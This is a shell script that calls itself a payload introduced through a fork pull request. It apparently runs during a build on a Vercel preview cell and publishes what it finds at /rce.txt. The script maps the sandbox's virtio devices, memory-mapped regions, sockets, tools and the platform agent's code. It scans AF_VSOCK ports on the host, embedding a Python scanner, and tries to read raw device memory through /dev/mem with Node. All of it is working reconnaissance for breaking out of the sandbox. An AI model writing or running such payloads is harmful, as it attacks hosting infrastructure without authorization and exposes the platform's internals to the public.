#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 6: hunt the host channel.
# The cell has five virtio-MMIO devices; one of them (type 0x0013) is
# VIRTIO_ID_VSOCK (19) — a device whose peer lives OUTSIDE the guest.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== virtio drivers compiled into the guest kernel =="
  ls /sys/bus/virtio/drivers 2>&1 | tr '\n' ' '
  echo
  for d in /sys/bus/virtio/devices/*; do
    n=$(basename "$d")
    echo -n "  $n type="; cat "$d/device" 2>/dev/null | head -1
    echo -n "     driver: "; readlink -f "$d/driver" 2>&1
  done
  echo "== /proc/iomem (MMIO regions the VMM exposes to the guest) =="
  head -30 /proc/iomem 2>&1
  echo "== /proc/ioports =="
  head -15 /proc/ioports 2>&1
  echo "== device nodes of interest =="
  ls -la /dev/vda /dev/vdb /dev/mem /dev/kmem 2>&1
  echo "== host hints from the guest =="
  head -12 /proc/cpuinfo 2>&1
  cat /proc/1/cgroup 2>&1 | head -5
  cat /proc/mounts 2>&1 | head -14
  echo "== the in-cell agent: what channel does it use to talk to the platform? =="
  ls -la /var/task 2>&1 | head -12
  grep -o -E 'vsock|VSOCK|celld|169\.254\.[0-9.]+|unix://[^"]*|/run/[a-z]+/[a-z.]+|wss?://[^"]{0,60}' /var/task/index.js 2>/dev/null | sort -u | head -30
  echo "== every unix socket in the cell =="
  find /run /var/run /tmp -type s 2>/dev/null | head -20
  echo "== interpreters / tools available =="
  for c in python3 python python3.12 python3.11 perl ruby socat gcc cc clang go rustc cargo tclsh lua php busybox nc openssl curl wget jq make gdb strace insmod modprobe losetup mount xxd od; do
    p=$(command -v "$c" 2>/dev/null); [ -n "$p" ] && echo "  $c -> $p"
  done
  echo "  UV_PYTHON_INSTALL_DIR=${UV_PYTHON_INSTALL_DIR:-} UV_PYTHON_BIN_DIR=${UV_PYTHON_BIN_DIR:-}"
  ls -la "${UV_PYTHON_INSTALL_DIR:-/nonexistent}" 2>&1 | head -5
} > "$F" 2>&1
{
  echo "== AF_VSOCK sweep: can the guest dial the host? =="
  PY=$(command -v python3 || command -v python)
  if [ -n "$PY" ]; then
    cat > /tmp/v.py <<'PYEOF'
import socket, time
A = getattr(socket, "AF_VSOCK", None)
print("  socket.AF_VSOCK =", A)
if A is None:
    raise SystemExit(0)
try:
    s = socket.socket(A, socket.SOCK_STREAM)
    print("  our own socket:", s.getsockname())
    s.close()
except Exception as e:
    print("  socket() probe:", repr(e))
t0 = time.time()
ports = list(range(1, 1025)) + [2000,2020,2048,3000,3001,4000,4242,4444,5000,5001,5005,6000,7000,7001,8000,8001,8080,8081,8082,8090,8095,8100,8402,8443,8888,9000,9001,9002,9090,9091,9100,9200,9411,9500,9999,10000,10001,10443,11000,12000,12345,16000,20000,30000,40000,50000,60000,65535]
seen = {}
n = 0
first_err = None
for cid in (2, 3):
    for p in ports:
        if time.time() - t0 > 50:
            break
        n += 1
        try:
            s = socket.socket(A, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((cid, p))
            try:
                s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
                d = s.recv(400)
            except Exception as e:
                d = b"connected, no banner: " + repr(e).encode()
            print("  VSOCK OPEN cid=%d port=%d -> %r" % (cid, p, d[:200]))
            seen[(cid, p)] = 1
            s.close()
        except Exception as e:
            if first_err is None:
                first_err = repr(e)
    print("  scanned %d cid/port pairs in %.1fs; open: %s; first error: %s"
          % (n, time.time() - t0, sorted(seen) or "none", first_err))
PYEOF
    "$PY" /tmp/v.py 2>&1
  else
    echo "  no python in the image; cannot exercise AF_VSOCK from userland"
  fi
} >> "$F" 2>&1
{
  echo "== MMIO register dump via /dev/mem (if readable) =="
  node -e '
const fs=require("fs");
let mem=null;
try{mem=fs.openSync("/dev/mem","r");}catch(e){console.log("  /dev/mem: "+e.code);process.exit(0);}
const io=fs.readFileSync("/proc/iomem","utf8").split("\n").filter(l=>/virtio|mmio/i.test(l)).slice(0,12);
if(!io.length)console.log("  (no virtio/mmio entries in /proc/iomem)");
for(const l of io){
  const m=l.match(/^\s*([0-9a-f]+)-([0-9a-f]+)\s*:\s*(.*)$/); if(!m)continue;
  const base=parseInt(m[1],16), sz=parseInt(m[2],16)-base+1;
  const buf=Buffer.alloc(Math.min(sz,64));
  try{const got=fs.readSync(mem,buf,0,buf.length,base);
    console.log("  "+m[1]+"-"+m[2]+" ("+m[3].trim()+") "+got+"b: "+buf.slice(0,got).toString("hex").replace(/(.{8})/g,"$1 ").trim());
  }catch(e){console.log("  "+m[1]+" read failed "+e.code);}
}
' >> "$F" 2>&1
} >> "$F" 2>&1
sleep 2
cat "$F"
